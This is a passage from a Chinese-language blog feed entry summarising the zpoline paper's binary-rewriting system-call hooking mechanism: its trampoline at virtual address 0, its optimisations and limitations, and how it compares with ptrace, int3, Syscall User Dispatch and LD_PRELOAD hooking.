实现过程</h2><p>（1）使用<code>mmap</code>分配虚拟地址为0的内存。注：默认情况下，仅允许root用户映射到虚拟地址0的内存，但可以通过将<code>/proc/sys/vm/mmap_min_addr</code>设置为0来允许所有非root用户映射到虚拟地址0。接着，将<code>0-500</code>存入<code>nop</code>，然后在后面存放跳转到钩子函数的代码。并在相应位置存放钩子函数。</p><p>（2）遍历可执行内存区域，将<code>`syscall/sysenter</code>用<code>callq *%rax(0xff 0xd0)</code>代替。</p><p>&emsp;注：此实现不会更改用户态程序的二进制文件，因为二进制重写是在加载到内存的代码二进制上完成的。上述过程是通过导入库<code>libzpoline.so</code>完成的。</p><h2 id="0x02-进一步优化"><a href="#0x02-进一步优化" class="headerlink" title="0x02 进一步优化"></a>0x02 进一步优化</h2><h3 id="优化1"><a href="#优化1" class="headerlink" title="优化1"></a>优化1</h3><p>&emsp;如果要修改钩子函数的代码，就要修改<code>libzpoline.so</code>。然而，若钩子函数中如果也执行有<code>syscall/sysenter</code>，就会陷入无限循环。为了避免这种情况，使用了<code>dlmopen</code>（<code>dlopen</code>的扩展）。<code>dlopen</code>用于向用户态程序加载库文件，而<code>dlmopen</code>允许用户指定加载库的命名空间，并在同一个命名空间中进行关联。</p><p>&emsp;因此，<code>dlmopen</code>可以帮我们屏蔽导入的<code>libzpoline.so</code>中的钩子函数。使用<code>dlmopen</code>打开<code>libzpoline.so</code>，且使用<code>dlsym</code>（动态链接库操作句柄与符号，返回符号对应的地址）获得钩子函数的指针。钩子函数在<code>libzpoline.so</code>中实现，并通过指针来调用它。</p><h3 id="优化2"><a href="#优化2" class="headerlink" title="优化2"></a>优化2</h3><p>&emsp;通常虚拟地址0是null指针，你占掉不太合适吧，这会导致null访问终止无法进行下去。null访问终止是一种保护机制，当变量为null时，就会触发此机制。为了让此机制继续运行下去，做了如下优化：</p><p>（1）为了终止null的读写，zpoline将trampoline代码配置为<code>eXecute-Only Memory (XOM)</code>；用户态程序要读写XOM处的内存时会显示错误。</p><p>&emsp;注：在支持内存保护密钥MPK的CPU上运行Linux，<code>mprotect</code>系统调用当参数为<code>PROT_EXEC</code>时，会配置为XOM（仅执行，不可读写）。</p><p>（2）为了终止null的执行，zpoline收集所有<code>syscall/sysenter</code>地址，并检查调用钩子函数的是替换<code>syscall/sysenter</code>的地址来的，还是由于null执行来的。如果是null执行来的就终止。地址可以由bitmap存储，虽然看似占据很大空间，但是物理内存消耗很小，因为所有位都清零的虚拟地址页不需要底层物理内存页。</p><h2 id="0x03-约束（此方案的缺陷）"><a href="#0x03-约束（此方案的缺陷）" class="headerlink" title="0x03 约束（此方案的缺陷）"></a>0x03 约束（此方案的缺陷）</h2><p>（1）此方案无法钩取<code>libzpoline.so</code>初始化之后出现的<code>syscall/sysenter</code>，可以通过借用<code>X-Containers</code>中提出的在线二进制重写的思想来解决这个问题（具体思想是啥俺也不懂，没看还）。</p><p>（2）内核可以通过vDSO（虚拟动态共享对象），使得用户态程序使用多种系统调用。zpoline无法钩取基于vDSO的系统，但是我们能禁用vDSO呀。</p><p>（3）如果虚拟地址0不可用的话，那么zpoline将无效。例如虚拟地址0已经被其他用途使用，或者内核不许映射到0。</p><p>（4）windows不可使用zpoline，这是因为最小可分配虚拟地址不得小于<code>0x10000</code>。但是windows提供了针对linux的兼容层，叫做<code>Windows Subsustem for Linux(WSL)</code>。zpoline是可以运行在WSL2中的。macos也不能使用zpoline，因为虚拟地址0被特殊的段<code>__PAGEZERO</code>所占据。</p><p>（5）某些CPU架构也不能使用zpoline，这些CPU架构特点为：指令长度固定，而且跳转地址必须为某值的倍数，例如arm就不能用zpoline。这是因为，跳转可能为虚拟地址<code>0-500</code>的任意值。</p><h2 id="0x04-其他挂钩机制的原理"><a href="#0x04-其他挂钩机制的原理" class="headerlink" title="0x04 其他挂钩机制的原理"></a>0x04 其他挂钩机制的原理</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>&emsp;这是UNIX系统的机制，跟踪器进程可以钩取被跟踪进程尝试运行的系统调用。由于<code>ptrace</code>是内核的特征，因此它可以实现<code>详尽的钩子</code>。但是由于跟踪器进程与被跟踪进程之间的上下文切换，它的钩子开销是巨大的。</p><h3 id="int3-信号"><a href="#int3-信号" class="headerlink" title="int3 信号"></a>int3 信号</h3><p>&emsp;int3可以导致软件中断，内核处理它并向执行 int3 的用户态进程发出<code>SIGTRAP</code>。使用int3代替<code>syscall/sysenter</code>，并将<code>SIGTRAP</code>的handler当作钩子函数。它的开销也是巨大的，因为它涉及内核的上下文操作。</p><h3 id="Syscall-User-Dispatch-SUD"><a href="#Syscall-User-Dispatch-SUD" class="headerlink" title="Syscall User Dispatch(SUD)"></a>Syscall User Dispatch(SUD)</h3><p>&emsp;最初目的是在linux上运行windows游戏时兼容性更高，可以直接使用系统调用调用ring3的函数。它提供了一种重定向到任意用户态代码的方式。内核在系统调用的入口实现了钩子，<strong>当SUD启用时，挂钩点向用户态进程发送<code>SIGSYS</code>信号，从而使用户态程序使用<code>SIGSYS</code>的handler当作系统调用的钩子（类似于int3）。</strong>由于handler处理需要时间，因此也会造成性能损失。</p><h3 id="利用LD-PRELOAD的函数替换"><a href="#利用LD-PRELOAD的函数替换" class="headerlink" title="利用LD_PRELOAD的函数替换"></a>利用LD_PRELOAD的函数替换</h3><p>&emsp;<code>ld.so</code>提供的<code>LD_PRELOAD</code>特性使得在程序main函数执行前加载特定共享库，这样的话就可以选择性的重写共享库中的函数调用。此机制性能损失很小，因为钩子只需要函数指针重写后就可部署。</p><p>&emsp;函数调用的钩子与系统调用钩子不同。此方法只能钩取函数，而对于没有包装函数（或者内部函数包装的）的<code>syscall/sysenter</code>则无法钩取（例如<code>glibc</code>），即无法实现<code>详尽的钩子</code>，即，不是将用户态OS子系统应用于现有用户态程序的适当选项；例如，如果系统调用未正确挂钩，则由用户态OS子系统打开的文件描述符将被传递到内核态OS子系统，并导致系统出现异常行为。</p><h2 id="0x05-项目注释-链接"><a href="#0x05-项目注释-链接" class="headerlink" title="0x05 项目注释+链接"></a>0x05 项目注释+链接</h2><p><a href="https://github.com/WD-2711/zpoline">https://github.com/WD-2711/zpoline</a></p><p>Done!</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;zpoline：基于二进制重写的系统调用钩子机制&quot;&gt;&lt;a href=&quot;#zpoline：基于二进制重写的系统调用钩子机制&quot; class=&quot;headerlink&quot; title=&quot;zpoline：基于二进制重写的系统调用钩子机制&quot;&gt;&lt;/a&gt;zpoline：基于二进制重写的系统调用钩子机制&lt;/h1&gt;&lt;p&gt;&amp;emsp;优势：钩子开销低、不会覆盖不应修改的指令、无需更改内核（什么意思？）、不需要用户态程序的源代码、不需要依赖特定的标准库、可用于系统调用仿真、详尽的钩子（exhaustive hooking）。&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
</feed>
